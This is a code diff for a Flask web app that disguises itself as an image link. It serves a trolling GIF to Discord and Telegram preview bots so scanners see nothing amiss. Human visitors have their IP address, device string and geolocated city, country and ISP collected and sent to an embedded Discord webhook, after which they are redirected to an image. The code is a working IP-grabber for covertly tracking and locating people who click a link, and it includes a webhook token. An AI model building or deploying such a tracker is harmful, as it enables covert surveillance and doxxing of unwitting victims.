@@ -5,31 +5,49 @@ import io
 
 app = Flask(__name__)
 
-# YOUR WEBHOOK URL
 WEBHOOK_URL = "https://discord.com/api/webhooks/1499375993515802814/k7NlaKYQ6E9E89EvLFXmqYmQHzSldINIRkq3CZB2JqImHP4ROw7Wa2qbjLtFhgitQmKe"
 
 @app.route('/view/image_01.png')
 def logger():
     user_agent = request.user_agent.string.lower()
     
-    # 1. DISCORD PREVIEW: Show the Tenor Trolling GIF
     if "discord" in user_agent or "telegram" in user_agent:
-        # Direct Tenor Media Link
         r = requests.get("https://media1.tenor.com/m/ziNSDDTCyiwAAAAC/discord-trolling.gif")
         return send_file(io.BytesIO(r.content), mimetype='image/gif')
 
-    # 2. THE TRAP: Grab human IP
+    # THE ENHANCED TRAP
     user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     
+    # Lookup Location Data
+    city, country, isp = "Unknown", "Unknown", "Unknown"
+    try:
+        geo_data = requests.get(f"http://ip-api.com/json/{user_ip}").json()
+        if geo_data['status'] == 'success':
+            city = geo_data.get('city')
+            country = geo_data.get('country')
+            isp = geo_data.get('isp')
+    except:
+        pass
+    
     payload = {
-        "content": f"🎯 **Target Clicked!**\n**IP:** `{user_ip}`\n**Device:** `{request.user_agent}`"
+        "embeds": [{
+            "title": "🎯 Target Intercepted!",
+            "color": 15158332,
+            "fields": [
+                {"name": "🌍 Location", "value": f"{city}, {country}", "inline": True},
+                {"name": "🌐 ISP", "value": isp, "inline": True},
+                {"name": "📌 IP Address", "value": f"`{user_ip}`", "inline": False},
+                {"name": "📱 Device", "value": f"```{request.user_agent}```", "inline": False}
+            ],
+            "footer": {"text": "Project Alpha - Geo Tracker"}
+        }]
     }
+    
     try:
         requests.post(WEBHOOK_URL, json=payload)
     except:
         pass
 
-    # 3. THE REDIRECT: Send them to the final image
     return redirect("https://i.imgur.com/BcNs5vF.jpg")
 
 if __name__ == "__main__":
